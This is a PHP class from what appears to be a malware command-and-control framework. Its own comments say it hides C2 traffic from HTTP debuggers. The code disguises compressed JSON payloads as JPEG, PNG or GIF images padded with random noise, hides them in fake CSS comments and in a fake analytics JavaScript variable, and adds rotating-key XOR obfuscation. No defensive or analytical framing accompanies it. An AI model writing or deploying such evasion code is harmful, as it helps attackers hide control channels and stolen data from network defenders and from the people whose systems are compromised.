<?php
declare(strict_types=1);

namespace Core;

/**
 * Traffic obfuscation layer - hides C2 communication from HTTP debuggers
 * Uses steganography and protocol mimicry
 */
final class Obfuscator
{
    private const JPEG_HEADER = "\xFF\xD8\xFF\xE0";
    private const PNG_HEADER = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A";
    private const GIF_HEADER = "GIF89a";

    /**
     * Encode JSON payload as fake image (steganography)
     */
    public function encodeAsImage(array $data, string $format = 'jpeg'): string
    {
        $json = json_encode($data);
        $compressed = gzcompress($json, 9);

        // Add image header based on format
        $header = match($format) {
            'png' => self::PNG_HEADER,
            'gif' => self::GIF_HEADER,
            default => self::JPEG_HEADER,
        };

        // Embed data after header with length prefix
        $length = pack('N', strlen($compressed));
        $payload = $header . $length . $compressed;

        // Pad with random noise to look like image data
        $noise = random_bytes(rand(512, 2048));

        return $payload . $noise;
    }

    /**
     * Decode fake image back to JSON
     */
    public function decodeFromImage(string $data): ?array
    {
        // Detect format and strip header
        $headerLen = 0;
        if (str_starts_with($data, self::JPEG_HEADER)) {
            $headerLen = 4;
        } elseif (str_starts_with($data, self::PNG_HEADER)) {
            $headerLen = 8;
        } elseif (str_starts_with($data, self::GIF_HEADER)) {
            $headerLen = 6;
        } else {
            return null;
        }

        // Extract length and compressed data
        $lengthData = substr($data, $headerLen, 4);
        if (strlen($lengthData) !== 4) {
            return null;
        }

        $length = unpack('N', $lengthData)[1];
        $compressed = substr($data, $headerLen + 4, $length);

        $json = @gzuncompress($compressed);
        if ($json === false) {
            return null;
        }

        return json_decode($json, true);
    }

    /**
     * Encode as fake CSS file (protocol mimicry)
     */
    public function encodeAsCSS(array $data): string
    {
        $json = json_encode($data);
        $encoded = base64_encode(gzcompress($json, 9));

        // Hide data in CSS comments
        $css = "/* Stylesheet v1.0 */\n";
        $css .= "body { margin: 0; padding: 0; }\n";
        $css .= "/* " . $encoded . " */\n";
        $css .= ".container { width: 100%; }\n";

        return $css;
    }

    /**
     * Decode from fake CSS
     */
    public function decodeFromCSS(string $css): ?array
    {
        // Extract from comment
        if (preg_match('/\/\*\s*([A-Za-z0-9+\/=]+)\s*\*\//', $css, $matches)) {
            $encoded = $matches[1];
            $compressed = base64_decode($encoded);
            $json = @gzuncompress($compressed);

            if ($json === false) {
                return null;
            }

            return json_decode($json, true);
        }

        return null;
    }

    /**
     * Encode as fake JavaScript (protocol mimicry)
     */
    public function encodeAsJS(array $data): string
    {
        $json = json_encode($data);
        $encoded = base64_encode(gzcompress($json, 9));

        // Hide in JS variable
        $js = "// Analytics tracker v2.1\n";
        $js .= "var _config = '" . $encoded . "';\n";
        $js .= "function track() { return true; }\n";

        return $js;
    }

    /**
     * Decode from fake JS
     */
    public function decodeFromJS(string $js): ?array
    {
        if (preg_match('/var\s+_config\s*=\s*[\'"]([A-Za-z0-9+\/=]+)[\'"]/', $js, $matches)) {
            $encoded = $matches[1];
            $compressed = base64_decode($encoded);
            $json = @gzuncompress($compressed);

            if ($json === false) {
                return null;
            }

            return json_decode($json, true);
        }

        return null;
    }

    /**
     * XOR obfuscation with rotating key
     */
    public function xorObfuscate(string $data, string $key): string
    {
        $keyLen = strlen($key);
        $result = '';

        for ($i = 0; $i < strlen($data); $i++) {
            $result .= $data[$i] ^ $key[$i % $keyLen];
        }

        return $result;
    }

    /**
     * Generate random-looking but deterministic key from secret
     */
    public function deriveKey(string $secret, int $length = 32): string
    {
        return substr(hash('sha256', $secret, true), 0, $length);
    }
}
